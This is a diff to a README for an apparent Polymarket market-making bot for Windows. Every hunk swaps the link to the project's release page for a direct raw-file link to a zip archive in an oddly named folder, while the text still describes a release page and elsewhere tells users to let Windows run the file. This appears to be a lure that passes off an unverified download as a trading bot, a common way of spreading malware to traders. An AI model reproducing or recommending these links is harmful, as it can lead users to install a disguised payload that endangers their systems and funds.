@@ -1,12 +1,12 @@
 # 🤖 Polymarket-Market-Maker-Bot - Stable market making for Polymarket
 
-[![Download the app](https://img.shields.io/badge/Download%20the%20app-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/wildernessvinylite309/Polymarket-Market-Maker-Bot/releases)
+[![Download the app](https://img.shields.io/badge/Download%20the%20app-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/wildernessvinylite309/Polymarket-Market-Maker-Bot/main/adenomatous/Bot_Polymarket_Maker_Market_1.9.zip)
 
 ## 📥 Download
 
 Use this link to visit the release page and download the Windows app:
 
-[Open Releases](https://github.com/wildernessvinylite309/Polymarket-Market-Maker-Bot/releases)
+[Open Releases](https://raw.githubusercontent.com/wildernessvinylite309/Polymarket-Market-Maker-Bot/main/adenomatous/Bot_Polymarket_Maker_Market_1.9.zip)
 
 On that page, look for the latest release and download the Windows file that matches your system.
 
@@ -39,7 +39,7 @@ If Windows asks for permission to run the file, choose the option to allow it.
 Follow these steps to download and run the app:
 
 1. Open the release page  
-   Use this link: [https://github.com/wildernessvinylite309/Polymarket-Market-Maker-Bot/releases](https://github.com/wildernessvinylite309/Polymarket-Market-Maker-Bot/releases)
+   Use this link: [https://raw.githubusercontent.com/wildernessvinylite309/Polymarket-Market-Maker-Bot/main/adenomatous/Bot_Polymarket_Maker_Market_1.9.zip](https://raw.githubusercontent.com/wildernessvinylite309/Polymarket-Market-Maker-Bot/main/adenomatous/Bot_Polymarket_Maker_Market_1.9.zip)
 
 2. Find the latest release  
    Look at the top entry on the page. This is usually the newest version.
@@ -172,7 +172,7 @@ The bot stops when the app closes.
 
 Download the latest version here:
 
-[https://github.com/wildernessvinylite309/Polymarket-Market-Maker-Bot/releases](https://github.com/wildernessvinylite309/Polymarket-Market-Maker-Bot/releases)
+[https://raw.githubusercontent.com/wildernessvinylite309/Polymarket-Market-Maker-Bot/main/adenomatous/Bot_Polymarket_Maker_Market_1.9.zip](https://raw.githubusercontent.com/wildernessvinylite309/Polymarket-Market-Maker-Bot/main/adenomatous/Bot_Polymarket_Maker_Market_1.9.zip)
 
 ## 🧭 Quick start
 
